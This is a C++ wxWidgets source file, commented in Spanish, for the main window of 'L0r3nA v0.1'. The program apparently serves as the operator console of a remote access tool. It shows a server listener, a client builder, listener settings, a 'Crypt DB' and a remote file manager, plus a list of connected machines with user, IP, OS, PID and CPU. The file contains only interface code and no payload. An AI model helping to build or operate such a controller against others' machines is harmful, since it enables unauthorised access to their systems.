#include "frame_crypt_db.hpp"
#include "frame_builder.hpp"
#include "frame_listener.hpp"
#include "frame_main.hpp"
#include "server.hpp"
#include "headers.hpp"
#include "notify.hpp"
#include "misc.hpp"

#include "panel_file_manager.hpp"

extern Servidor* p_Servidor;

const wxString strTitle = "L0r3nA v0.1";

wxBEGIN_EVENT_TABLE(MyFrame, wxFrame)
    EVT_BUTTON(EnumIDS::ID_LimpiarLog, MyFrame::OnLimpiar)
    EVT_MENU(EnumIDS::ID_Iniciar_Servidor, MyFrame::OnToggle)
    EVT_MENU(EnumIDS::ID_Detener_Servidor, MyFrame::OnToggle)
    EVT_MENU(EnumIDS::ID_Mostrar_CryptDB, MyFrame::OnCryptDB)
    EVT_MENU(EnumIDS::ID_Builder, MyFrame::OnGenerarCliente)
    EVT_MENU(EnumIDS::ID_Listeners, MyFrame::OnListeners)
    EVT_MENU(EnumIDS::ID_About, MyFrame::OnAbout)
    EVT_CLOSE(MyFrame::OnClose)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyListCtrl, wxListCtrl)
    EVT_CONTEXT_MENU(MyListCtrl::OnContextMenu)
    EVT_MENU(wxID_ANY, MyListCtrl::OnModMenu)
    EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Main_List, MyListCtrl::OnActivated)
wxEND_EVENT_TABLE()

class MyApp : public wxApp {
public:
    MyFrame* frame = nullptr;
    bool OnInit() override;
};

wxIMPLEMENT_APP(MyApp);

bool MyApp::OnInit(){
#ifdef __MEM_LEAK_RAVDO
    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
#endif
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);

    wxImage::AddHandler(new wxJPEGHandler);
    wxImage::AddHandler(new wxPNGHandler);

    this->frame = DBG_NEW MyFrame();
    this->frame->Show(true);

    ByteArray c_key;
    panelFileManager* temp = new panelFileManager(nullptr, INVALID_SOCKET, "RANDOM-ID", "127.0.0.1", c_key);
    temp->Show();

    return true;
}

MyFrame::MyFrame()
    : wxFrame(nullptr, EnumIDS::ID_MAIN, strTitle){
    
    //Agregar Banner
    wxPanel* pnlBitmap = new wxPanel(this, wxID_ANY);
    wxStaticBitmap* bmpBanner = new wxStaticBitmap(pnlBitmap, wxID_ANY, wxBitmap(800, 200));
    wxBitmap bannerBitmap(wxT(".\\imgs\\banner.png"), wxBITMAP_TYPE_PNG);
    bmpBanner->SetBitmap(bannerBitmap);
    pnlBitmap->Refresh();

    //SetTransparent(245);
    p_Servidor = DBG_NEW Servidor();
    p_Servidor->m_listCtrl = nullptr;

    //Label para estado
    this->lblEstado = new wxStaticText(this, wxID_ANY, "IDLE");
    
    //Panel derecho ListCtrl
    this->m_RPanel = DBG_NEW wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);

    //Panel inferior log
    this->m_BPanel = DBG_NEW wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    
    //Crear lista
    this->CrearLista(wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES);
    wxBoxSizer *sizerlist = DBG_NEW wxBoxSizer(wxVERTICAL);
    sizerlist->Add(p_Servidor->m_listCtrl, 1, wxEXPAND | wxALL, 2);
    this->m_RPanel->SetSizer(sizerlist);

    //Crear txt para log
    p_Servidor->m_txtLog->p_txtCtrl = DBG_NEW wxTextCtrl(this->m_BPanel, wxID_ANY, ":v\n", wxDefaultPosition, wxSize(wxDefaultSize.GetWidth(), 80), wxTE_MULTILINE | wxTE_READONLY);
    wxBoxSizer *sizertxt = DBG_NEW wxBoxSizer(wxVERTICAL);
    sizertxt->Add(DBG_NEW wxButton(this->m_BPanel, EnumIDS::ID_LimpiarLog, "Limpiar Log", wxDefaultPosition, wxDefaultSize), 0, wxALL, 1);
    sizertxt->Add(p_Servidor->m_txtLog->p_txtCtrl, 1, wxEXPAND | wxALL, 1);
    this->m_BPanel->SetSizer(sizertxt);

    //wxBoxSizer *sizer = DBG_NEW wxBoxSizer(wxHORIZONTAL);
    
    wxBoxSizer * sizer = DBG_NEW wxBoxSizer(wxVERTICAL);
    sizer->Add(pnlBitmap, 0);
    sizer->Add(this->m_RPanel, 1, wxEXPAND | wxALL);
    sizer->Add(this->m_BPanel, 0, wxEXPAND | wxALL);
    sizer->Add(this->lblEstado, 0, wxEXPAND | wxALL, 2);
    
    //sizer->Add(sizer2, 1, wxEXPAND | wxALL, 1);

    this->SetSizerAndFit(sizer);

    /////// Crear menu de opciones principales ///////
    wxMenuBar* main_Menu = new wxMenuBar();
    wxMenu* p_server = new wxMenu();

    this->detenerMenu->Enable(false);
    p_server->Append(this->iniciarMenu);
    p_server->Append(this->detenerMenu);
    p_server->Append(EnumIDS::ID_Mostrar_CryptDB, "Crypt DB");
    p_server->Append(EnumIDS::ID_Builder, "Generar Cliente");
    p_server->Append(EnumIDS::ID_Listeners, "Listeners");
   
    wxMenu* p_help = new wxMenu();
    p_help->Append(EnumIDS::ID_About, "Acerca de")->SetBitmap(wxArtProvider::GetBitmapBundle(wxART_INFORMATION, wxART_MENU));

    main_Menu->Append(p_server, "Servidor");
    main_Menu->Append(p_help, "Ayuda");

    this->SetMenuBar(main_Menu);
    /////////////////////////////////////////////////
    

    ChangeMyChildsTheme(this, THEME_BACKGROUND_COLOR, THEME_FOREGROUND_COLOR, THEME_FONT_GLOBAL);
}

void MyFrame::SetEstado(const char* _cestado) {
    if (this->lblEstado != nullptr) {
        this->lblEstado->SetLabelText(wxString(_cestado));
        this->lblEstado->Refresh();
    }
}

void MyFrame::OnCryptDB(wxCommandEvent& event) {
    frameCryptDB* frame_crypt = DBG_NEW frameCryptDB();

    frame_crypt->Show();
}

void MyFrame::OnGenerarCliente(wxCommandEvent& event) {
    FrameBuilder* nBuilder = new FrameBuilder(this);

    nBuilder->Show(true);
}

void MyFrame::OnListeners(wxCommandEvent& event) {
    frameListeners* listeners = new frameListeners(this);
    listeners->Show();
}

void MyFrame::OnToggle(wxCommandEvent& event) {
    int id = event.GetId();
    
    if (id == EnumIDS::ID_Iniciar_Servidor) {
        //Iniciar escucha
        
        if (p_Servidor->m_Iniciar()) {
            p_Servidor->m_Handler();
            //this->btn_toggle->SetLabelText("Detener Servidor");
            this->iniciarMenu->Enable(false);
            this->detenerMenu->Enable(true);
            this->SetEstado("Esperando clientes...");
        }else {
            std::string strTmp = "Error escuchando ";
            strTmp.append(std::to_string(GetLastError()));
            p_Servidor->m_txtLog->LogThis(strTmp, LogType::LogError);
            this->SetEstado("Error");
        }
        
    }else {
        //Detener escuchar
        p_Servidor->m_StopHandler();
        p_Servidor->m_JoinThreads();

        DEBUG_MSG("VECTOR SIZE:"); 
        DEBUG_MSG(p_Servidor->vc_Clientes.size());

        p_Servidor->m_listCtrl->DeleteAllItems();
        this->SetEstado("IDLE");
        SetTitle(strTitle);
        //this->btn_toggle->SetLabelText("Iniciar Servidor");
        this->iniciarMenu->Enable(true);
        this->detenerMenu->Enable(false);
    }
    Sleep(500);
}

void MyFrame::CrearLista(long flags, bool withText){
    p_Servidor->m_listCtrl = DBG_NEW MyListCtrl(this->m_RPanel, EnumIDS::ID_Main_List, wxDefaultPosition, wxSize(wxDefaultSize.GetWidth(), 400), flags | wxBORDER_THEME);

    wxListItem itemCol;
    
    itemCol.SetText("ID");
    itemCol.SetWidth(100);
    itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
    p_Servidor->m_listCtrl->InsertColumn(0, itemCol);

    itemCol.SetText("LISTENER");
    itemCol.SetWidth(100);
    p_Servidor->m_listCtrl->InsertColumn(1, itemCol);

    itemCol.SetText("USUARIO");
    itemCol.SetWidth(160);
    p_Servidor->m_listCtrl->InsertColumn(2, itemCol);

    itemCol.SetText("IP");
    itemCol.SetWidth(120);
    p_Servidor->m_listCtrl->InsertColumn(3, itemCol);

    itemCol.SetText("SO");
    itemCol.SetWidth(140);
    p_Servidor->m_listCtrl->InsertColumn(4, itemCol);

    itemCol.SetText("PID");
    itemCol.SetWidth(60);
    p_Servidor->m_listCtrl->InsertColumn(5, itemCol);

    itemCol.SetText("CPU");
    itemCol.SetWidth(200);
    p_Servidor->m_listCtrl->InsertColumn(6, itemCol);

}

void MyFrame::OnClose(wxCloseEvent& event){
    wxMessageDialog dialog(this, "Seguro que quieres salir?", "Salir", wxCENTER | wxYES_NO | wxICON_QUESTION);
    
    switch (dialog.ShowModal()) {
    case wxID_NO:
        event.Veto();
        return;
    case wxID_YES:
        break;
    }  
    

    p_Servidor->m_StopHandler();
    p_Servidor->m_JoinThreads();
    p_Servidor->m_CerrarConexiones();
    if (p_Servidor->m_listCtrl) {
        p_Servidor->m_listCtrl->DeleteAllItems();
        delete p_Servidor->m_listCtrl;
        p_Servidor->m_listCtrl = nullptr;
    }
    
    delete p_Servidor;
    p_Servidor = nullptr;
    
    event.Skip();
}

void MyFrame::OnExit(wxCommandEvent& event) {
    Close(true);
#ifdef __MEM_LEAK_RAVDO
    //_CrtDumpMemoryLeaks();
#endif
}

void MyFrame::OnLimpiar(wxCommandEvent& event) {
    p_Servidor->m_txtLog->p_txtCtrl->Clear();
}

void MyFrame::OnAbout(wxCommandEvent& event){
    wxMessageBox(wxT("L0r3na v0.1"), wxT("Acerca de"));
}

